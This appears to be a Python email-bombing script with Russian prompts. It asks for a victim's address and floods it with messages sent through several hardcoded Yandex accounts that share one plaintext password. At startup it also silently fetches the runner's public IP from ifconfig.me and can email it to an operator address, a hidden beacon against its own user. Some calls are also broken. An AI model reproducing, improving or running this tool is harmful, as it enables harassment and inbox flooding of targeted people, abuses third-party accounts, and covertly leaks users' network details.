### MODULES ###

print('MODULE LOADING... ', end = "")

from os import system

try:
    import smtplib
    import http.client
    import emailsender

    from datetime import datetime
    from os import system, name
    from time import sleep
    from colorama import Fore
except:
    print('STANDART MODULE IMPORT ERROR')
    print('TRYING TO INSTALL MODULES... ', end = "")
    try:
        system('pip3 install -r req.txt -q')
    except:
    	print("ERROR")
    exit()

try:
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
except:
    print('EMAIL MODULE IMPORT ERROR')
    exit()

print(Fore.GREEN + 'SUCCESS' + Fore.RESET, end = '\n')

### VARIABLES ###

conn = http.client.HTTPConnection("ifconfig.me")
smtp = "smtp.yandex.ru"
message = "Hello, world! This is a test message."

etloop = True
cloop = True

### FUNCTIONS ###

print('FUNCTIONS LOADING... ', end = "")

def log():
    return '[' + str(datetime.now()) + '] - '

def send_mail(message_body, login, password, toaddr):
    msg = MIMEMultipart()
    msg['Subject'] = 'Genarator'
    msg['From'] = login
    body = message_body
    msg.attach(MIMEText(body, 'plain'))

    conn = smtplib.SMTP_SSL(smtp, 465)
    conn.login(login, password)
    conn.sendmail(login, toaddr, msg.as_string())
    conn.quit()

print(Fore.GREEN + 'SUCCESS' + Fore.RESET, end = '\n\n\n')

### —-MAIN BODY-— ###

if __name__ == "__main__":
    system('clear')
    conn.request("GET", "/ip")
    if emailsender.pptplog == True:
        send_mail(log() + str(conn.getresponse().read()), emailsender.httpmaster, emailsender.pptplogpptplog)
    
    logpases = ["allhasim@yandex.ru",
                         "neonlsh@yandex.ru",
                         "pensifred@yandex.ru"]
    
    while cloop == True:
        victim = input('ВВЕДИТЕ АДРЕС ЭЛЕКТРОННОЙ ПОЧТЫ ЖЕРТВЫ:   ')
        
        while etloop == True:
            try:
                et = int(input('ВВЕДИТЕ КОЛИЧЕСТВО СООБЩЕНИЙ:   '))
            except ValueError:
                print('ОШИБКА ЗНАЧЕНИЯ, ВВЕДИТЕ ЕЩЁ РАЗ')
            else:
               etloop = False

        print("АДРЕС:   " + victim)
        print("КОЛИЧЕСТВО СООБЩЕНИЙ:   " + str(et))
        
        _continue = input("ВСЁ ВЕРНО? [y/n]   ")
        
        if _continue == 'y':
            cloop = False
        system('clear')
        
    account_id = 0
    i = 0
    print(len(logpases))
    for i in range(et):
        try:
            send_mail(message, logpases[account_id], 'snikers123', victim)
        except:
            print(log() + 'СООБЩЕНИЕ НЕ ОТПРАВЛЕНО ')
        else:
            print(log() + 'СООБЩЕНИЕ ' + str(i) + ' ОТПРАВЛЕНО ')
        i += 1
        account_id += 1
        if account_id == len(logpases) - 1:
        	account_id = 0

    print(log() + 'РАБОТА ПРОГРАММЫ ЗАВЕРШЕНА')